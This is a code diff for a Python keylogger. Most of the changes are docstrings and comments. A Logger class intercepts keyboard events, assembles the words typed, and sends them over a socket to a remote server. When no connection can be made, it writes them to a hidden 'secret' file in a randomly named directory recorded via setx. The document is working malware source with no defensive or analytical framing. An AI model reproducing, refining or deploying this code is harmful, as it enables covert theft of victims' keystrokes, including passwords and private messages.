@@ -22,6 +22,7 @@ def random_string(size, charset):
 	:return: A randomly generated string
 	:rtype: str
 	"""
+
 	return ''.join(choice(charset) for _ in range(size))
 
 
@@ -54,7 +55,7 @@ def create_random_dir_and_file():
 
 		final = random_directory_path + "\\" + random_file
 
-		# Set env var as new random file in new random dir
+		# Set env var as new random file in the new random dir
 		result = run(["setx", "SECURITY_KEY", final], check=False, stderr=PIPE).stderr
 
 		if result is not None:
@@ -77,10 +78,20 @@ class Logger:
 		self.filename = log_file
 
 	def init_conn(self) -> None:
+		"""
+		Creates a socket connection to the server.
+		"""
 		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.socket.connect(self.address)
 
-	def on_event(self, event: KeyboardEvent) -> None:
+	def on_event(self, event) -> None:
+		"""
+		Handle any intercepted keyboard input.
+
+		:param event: The keyboard event detected by the keyboard module
+		:type event: KeyboardEvent
+		"""
+
 		name, event_type = event.name, event.event_type
 		if name in ["space", "enter"] and self.current_string:
 			if name == "enter":
@@ -98,7 +109,15 @@ class Logger:
 		if event_type == "down" and name not in ["maj", "space", "enter"]:
 			self.current_string += event.name
 
-	def publish(self) -> bool:
+	def publish(self):
+		"""
+		Empty the queue by sending the intercepted keyboard activity to the specified server.
+		If a connection cannot be established, return False to properly handle it later.
+
+		:return: Wether the operation was successful.
+		:rtype: bool
+		"""
+
 		try:
 			self.init_conn()
 		except ConnectionRefusedError:
@@ -116,12 +135,19 @@ class Logger:
 		return True
 
 	def handle_input(self) -> None:
+		"""
+		The core method of the keylogger. Handle every intercepted keyboard input. When more than 10 "words" have been
+		captured, try to publish them. If an error occurs, ie a connection can't be established or it is interrupted,
+		save every remaining word to the specified "secret" file.
+		"""
+
 		while self.serving:
 			event = self.input_queue.get()
 			self.on_event(event)
 			self.input_queue.task_done()
-			if self.output_queue.qsize() >= 10:
+			if self.output_queue.qsize() >= 10:  # Arbitrary treshold, can/should be adjusted
 				if not self.publish():
+					# There was an error while publishing, so save to file
 					with open(self.filename, "a") as _:
 						while self.output_queue.qsize():
 							current = self.output_queue.get() + " "
